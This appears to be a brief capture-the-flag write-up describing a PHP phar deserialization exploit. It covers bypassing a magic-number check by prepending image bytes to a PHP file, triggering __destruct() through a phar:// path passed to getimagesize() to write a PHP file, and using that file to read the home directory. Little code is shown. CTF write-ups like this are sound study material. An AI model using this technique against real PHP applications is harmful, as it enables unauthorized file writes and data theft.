###phar unserialize vulnerability###

###Part1 : Bypass Magic num check
	An interesting part of php is that it will look for '<?php' tag before resolving script
	Thus, adding the magic bytes in front of file can help bypass check and maintain a valid php

###Part2 : Create phar
	Since there are many file operations, and a class with defined __destruct() magic method, 
	  it is reasonable to think that phar exploit is the key of this question
	Moreover, the variable of getimagesize() is completely controlable further strengthens this guess

	Examining the __destruct() functions show that a abitrary file upload/delete might be possible
	However, since our goal is to leak data, upload seems more reasonable than delete
	Thus, I created a phar archive that create a php file with the code showns in appendix below
		ps. phar://[path]/James.txt as variable will trigger the unserialization of Metadata in any file operation


###Part3 : Get flag
	Uploaded php file will cat everything in home directory, leaking the flag

		$phar->stopBuffering();
